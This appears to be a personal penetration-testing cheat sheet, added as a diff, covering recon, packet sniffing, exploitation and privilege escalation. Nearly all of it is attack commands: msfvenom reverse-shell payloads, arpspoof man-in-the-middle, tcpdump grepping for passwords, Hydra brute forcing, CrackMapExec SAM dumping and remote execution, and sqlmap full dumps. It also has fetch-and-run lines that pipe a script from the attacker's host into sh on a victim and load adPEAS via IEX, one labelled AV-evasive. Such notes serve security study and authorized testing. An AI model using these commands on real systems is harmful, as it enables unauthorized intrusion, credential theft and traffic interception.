@@ -1,0 +1,207 @@
+INITIAL ACCESS
+
+Initial access play-book:
+-Nmap to determine possible attack vector
+- Port vulnerabilities 
+ssh vulnerabilities (from Nmap scan)
+ftp vulnerabilities 
+smb vulnerabilities 
+Searchsploit based on services and O.S.
+EX:  searchsploit <EXPLOIT OR CVE>
+Use linpeas, winpeas, & adpeas to look for potential privilege escalation points (for when you gain initial access) 
+run your machine in promiscuous mode to see possibly hidden traffic
+use wireshark to analyze packet traffic for possible unencrypted data (try following the TCP and HTTP stream and looking at multiple indexes) 
+Password cracking use Hydra or Medusa
+	best use library attacks vs true brute
+
+Note for later: go more into depth about services like SMB, FTP, SSH, etc…
+
+Arpspoof(LAST RESORT) to determine if any hidden traffic between router and ip
+-----------------------------------------------
+COMMANDS TO KNOW
+
+SCANNING / OSINT / RECON
+-nmap -sV <IP>
+-nmap -sP
+-nmap -sn
+-nmap -sL 
+-nmap -O
+-nmap –top-ports <x> <IP> (x is for Top X ports)
+-nmap -oN output.txt (output in txt)
+-nmap -oX output.xml (output in xml)
+-nmap –sA <IP> (ACK scan to map out firewall rules) 
+-nmap -sF <IP>
+-nmap -sX
+-nmap -f (fragmented scan, for firewall evasion)
+-nmap –send-eth (tbh ive never used this i just read it so imagine its not even real lol)
+-nmap -A <IP> (Slow but shows all vulnerabilities)
+-nmap -p <PORT#>,<PORT#> <IP>
+-nmap –script vuln <IP>
+-nmap -Pn <IP>
+-rustscan -A <IP>
+-nmap -sS = SYN scan
+-nmap -F = fast scan
+-nmap -D = send a decoy 
+-nmap --script "safe" [target](runs all the safe attack scrips)
+-nmap --script "vuln" [target](runs specifically vuln scripts)
+-nmap --script "all" [target](dangerous only when necessary)
+sudo ifconfig <interface> promisc (should be run before packet sniffing)
+-sudo tcpdump -i <interface>
+-sudo tcpdump -i <interface> | grep “pass” “user”
+-sudo tcpdump -i <interface> host <HOST_IP>
+-sudo tcpdump -i <interface> dst <DESTINATION IP>
+-sudo tcpdump -i any (listens on any interface)
+-sudo tcpdump -i <interface> port <PORT#>
+-sudo tcpdump -i <interface> -w <FILE.pcap>
+-tcpdump -r <FILE.PCAP>
+-nikto –url <URL>
+-nikto –url <URL> -C all (looks through all directories)
+-sudo ifconfig eth0 promisc
+-arpspoof -i <interface> -t <target ip> <host ip> (Again Dangerous)
+-sudo echo 1 > /proc/sys/net/ipv4/ip_forward
+-dsniff
+	EX: dsniff -m [-i interface] [-s snap-length] [filter-expression] (must be run with arpspoof and a MiTM framework)
+-dhcpdump -i <interface>(useful if numerous dhcp packets are being sent)
+----------------------------------------------------------
+EXPLOITATION / COMPROMISE
+-msfconsole
+	-search (search exploit or payload)
+	-use (use payload or exploit)
+	-set (set targets)
+	-back (go back)
+	-background (background a meterpreter session)
+	-sessions -i <session#> (interact with a meterpreter session)
+
+-msfvenom -p windows/meterpreter/reverse_tcp LHOST=<Your IP Address> LPORT=<Your listening port> -f exe > payload.exe (WINDOWS)
+
+-msfvenom -p linux/x86/meterpreter/reverse_tcp LHOST=<Your_IP> LPORT=<Your_Port> -f elf > payload.elf (LINUX)
+
+-hydra -l(or -L for list of usernames) <username> -P <password_list> <target> <module>(module being the service) 
+EX: hydra -L users.txt -P pass.txt ssh://192.168.1.1
+
+responder -I <interface>
+
+crackmapexec <protocol> <IP> 
+
+crackmapexec <protocol> <IP> -u “” -p “” (uses empty username and password)
+
+crackmapexec <protocol> <IP> -u “Administrator” -p “P@ssW0rd” -x “whoami” (-x executes a command)
+
+crackmapexec <protocol> <IP> -u 'Administrator' -p 'PASS' --local-auth --sam (Dumps SAM hashes)
+
+crackmapexec <protocol> -L (List modules for protocols )
+
+crackmapexec <protocol> <IP> -u 'Administrator' -p 'PASS' --local-auth -M met_inject -o LHOST=YOURIP LPORT=4444 (use w/ metasploit staged listeners)
+
+netexec <protocol> <IP> –spider (crawls a service)
+
+impacket-<script> (There is a lot of impacket scripts research them)
+
+FOR BRUTEFORCING SITES
+-hydra -L /path/to/wordlist -P /path/to/wordlist <IP> http-post-form "/pathto/loginpage:username=<UNAME>&password=^PASS^:<WARNING>”
+
+-nc -lvnp <PORT#>
+
+-pwncat -l 4444 --self-inject /bin/sh:<IP>:<PORT>+<SHELL#>
+
+-commix -u <URL/PATH/TO/.PHP?>
+-commix -m <hosts.txt>
+-commix –url=”<URL>” –all
+-commix --url="http://<URL/PATH/TO.php?><cmd>="INJECT_HERE"
+-sqlmap -u <URL>
+-sqlmap -u <URL> –dump-all
+-sqlmap -u <URL> -a (scans everything)
+-sqlmap -u <URL> –random-agent
+-sqlmap -hh (advanced help)
+---------------------------------------------------------------
+PIVOTING / PRIVELGE ESCALATION
+-proxychains <command>
+	EX: proxychains nmap -sV 192.168.1.1
+-linpeass / winpeass
+	EX: (On victim machine) curl <YOUR_IP/path/to/peass> | sh
+
+	WinPEAS:
+	# Step 1: Download the appropriate binary (64-bit example)
+certutil -urlcache -split -f https://github.com/carlospolop/PEASS-ng/releases/latest/download/winPEASx64.exe winpeas.exe
+# Step 2: Execute it locally
+.	.\winpeas.exe
+
+	linPEAS
+	# Download and prepare
+curl -L https://github.com/carlospolop/PEASS-ng/releases/latest/download/linpeas.sh -o linpeas.sh 
+
+chmod +x linpeas.sh
+
+# Run full enumeration
+./linpeas.sh
+
+# Optional: stealth mode with fewer checks, no disk writes
+./linpeas.sh -s
+
+adPEAS
+
+# Full version (may trigger AV)
+IEX(IWR -usebasicparsing https://raw.githubusercontent.com/61106960/adPEAS/main/adPEAS.ps1); Invoke-adPEAS
+
+# Lighter version (less noisy/AV-evasive)
+IEX(IWR -usebasicparsing https://raw.githubusercontent.com/61106960/adPEAS/main/adPEAS-Light.ps1); Invoke-adPEAS
+
+A helpful command for redirecting to a file is useful in reverse-shell environment: 
+./linpeas.sh -a > /tmp/linpeas.txt
+
+
+Different Enumeration Tools:
+Nmap: 
+Open source terminal or cmd tool used to scan IP addresses and ports to detect services and their respective versions. It also has many other functions such as operation system detection, firewall evasion, bruteforce, etc. 
+Greenbone:
+Greenbone is another open source scanner that detects vulnerabilities on a network. It is GUI and CMD/Terminal based. 
+Here is my document on it. I wouldn't trust the installation tutorial because it wouldn't work for me for some unknown reason. Still trying to figure all that out   https://docs.google.com/document/d/1TE5jPTLvf4qlak0I-oG-OoD-z426Jr0IOdXyEFTwXbk/edit?usp=sharing
+Nessus
+A vulnerability scanner created by Tenable, is undoubtedly the most powerful scanner on this list. The GUI based. You can do so many different scans and add plugins, etc. It costs money but you can scan 16 IP addresses for free so it kinda costs money. 
+Netcraft
+A website to find the IP address of a server hosting a particular website
+NSLookup
+Useful for getting info from the DNS server and for IP address mapping. 
+Linpeas, Winpeas, & Adpeas
+A good tool for when you have gained some sort of initial access. Linpeas is for linux, win for windows and ad for active directory. They will scan your machine and look for any possible path to privilege escalation and output all the information to you. Even if it doesn't find anything it still tells you a lot of good information about the machine you are on for manual enumeration. 
+Wappalizer 
+A browser extension to see what different technologies are being used on a website and what it's built with. So you can see what programming language it was written in, its frameworks, etc.
+
+Wireshark
+ Free, open-source network protocol analyzer used to capture and inspect packets on wired and wireless networks. Supports hundreds of protocols, allows live capture and offline analysis, and includes powerful filtering, export, and visualization features. There are two filters, capture filters and display filters. Capture filters to narrow what is recorded. Display filters using Wireshark rich filtering syntax. The tools menu offers extras: credentials extractor, firewall ACL rule generator, TLS key-log launching, and stream reconstruction.
+
+TIPS & TRICKS
+Winpeas, Linpeas, & Adpeas
+Run WinPEAS or linPEAS immediately after gaining an initial shell to discover vectors quickly.
+Pipe output when shell is unstable: ./linpeas.sh -a > /tmp/linpeas.txt
+Use adPEAS from a domain-joined machine or PowerShell shell with AD access to map attack paths like Kerberoast, delegation, or DCSync
+
+Wireshark
+		Wireshark might be hard to understand and get started at first, but this will give you a step-by-step explanation on how to get it going.
+Start Wireshark; command: wireshark
+This will launch the GUI 
+Capture Filters (set before capturing) at the interface selection dialog.
+Capture only HTTP traffic; command: tcp port 80
+
+Capture all traffic from a specific IP; command: host 10.0.0.5
+Display Filters (After capture) use the filter toolbar above packet lists
+Show only HTTP GET requests; command: http.request.method == "GET"
+DNS queries; command: dns.qry.name == "example.com"
+Traffic to/from a host; command: ip.addr == 10.0.0.5
+Follow a TCP/HTTP Stream
+Right-click a packet → Follow → TCP Stream or HTTP Stream
+Reassembles the full conversation into readable form
+Extract Credentials or file
+Go to Tools → Credentials to extract captured credentials (FTP, HTTP auth, SMTP, etc.) .
+Use File → Export Objects to extract files transmitted (HTTP, SMB, etc.).
+CLI w/ TShark
+Run captures or analyze existing PCAPS via command line
+COMMANDS (with example fill-ins): 
+tshark -i eth0 -f "tcp port 443" -w capture.pcap
+tshark -r capture.pcap -Y "http.request"
+-f defines capture filter, -Y is a display filter
+Extract Useful Stats
+COMMAND (with example fill-ins):
+-  tshark -r capture.pcap -q -z io,stat,0,ip.src==10.0.0.5
+-	Gives packet counts grouped by 0-second intervals for that source IP
+
